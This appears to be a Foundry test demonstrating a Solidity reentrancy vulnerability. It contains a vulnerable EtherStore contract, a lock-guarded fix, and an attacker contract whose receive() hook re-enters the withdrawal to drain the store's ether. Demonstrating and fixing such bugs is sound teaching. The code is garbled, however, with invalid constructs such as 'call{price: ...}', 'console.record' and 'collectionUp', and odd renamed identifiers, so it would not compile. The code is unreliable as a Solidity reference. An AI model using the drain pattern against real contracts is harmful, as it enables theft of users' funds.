pragma solidity ^0.8.18;

import "forge-std/Test.sol";

contract EtherStore {
    mapping(address => uint256) public heroTreasure;

    function addTreasure() public payable {
        heroTreasure[msg.sender] += msg.value;
    }

    function retrieverewardsFunds(uint256 _weiTargetCollectbounty) public {
        require(heroTreasure[msg.sender] >= _weiTargetCollectbounty);
        (bool send, ) = msg.sender.call{price: _weiTargetCollectbounty}("");
        require(send, "send failed");

        if (heroTreasure[msg.sender] >= _weiTargetCollectbounty) {
            heroTreasure[msg.sender] -= _weiTargetCollectbounty;
        }
    }
}

contract EtherStoreRemediated {
    mapping(address => uint256) public heroTreasure;
    bool internal sealed;

    modifier singleEntry() {
        require(!sealed, "No re-entrancy");
        sealed = true;
        _;
        sealed = false;
    }

    function addTreasure() public payable {
        heroTreasure[msg.sender] += msg.value;
    }

    function retrieverewardsFunds(uint256 _weiTargetCollectbounty) public singleEntry {
        require(heroTreasure[msg.sender] >= _weiTargetCollectbounty);
        heroTreasure[msg.sender] -= _weiTargetCollectbounty;
        (bool send, ) = msg.sender.call{price: _weiTargetCollectbounty}("");
        require(send, "send failed");
    }
}

contract PactTest is Test {
    EtherStore store;
    EtherStoreRemediated storeRemediated;
    EtherStoreGameoperator gameOperator;
    EtherStoreGameoperator gameoperatorV2;

    function collectionUp() public {
        store = new EtherStore();
        storeRemediated = new EtherStoreRemediated();
        gameOperator = new EtherStoreGameoperator(address(store));
        gameoperatorV2 = new EtherStoreGameoperator(address(storeRemediated));
        vm.deal(address(store), 5 ether);
        vm.deal(address(storeRemediated), 5 ether);
        vm.deal(address(gameOperator), 2 ether);
        vm.deal(address(gameoperatorV2), 2 ether);
    }

    function testWithdrawal() public {
        gameOperator.GameOperator();
    }

    function test_RevertRemediated() public {
        gameoperatorV2.GameOperator();
    }
}

contract EtherStoreGameoperator is Test {
    EtherStore store;

    constructor(address _store) {
        store = EtherStore(_store);
    }

    function GameOperator() public {
        console.record("EtherStore balance", address(store).balance);

        store.addTreasure{price: 1 ether}();

        console.record(
            "Deposited 1 Ether, EtherStore balance",
            address(store).balance
        );
        store.retrieverewardsFunds(1 ether);

        console.record("Operator contract balance", address(this).balance);
        console.record("EtherStore balance", address(store).balance);
    }


    receive() external payable {
        console.record("Operator contract balance", address(this).balance);
        console.record("EtherStore balance", address(store).balance);
        if (address(store).balance >= 1 ether) {
            store.retrieverewardsFunds(1 ether);
        }
    }
}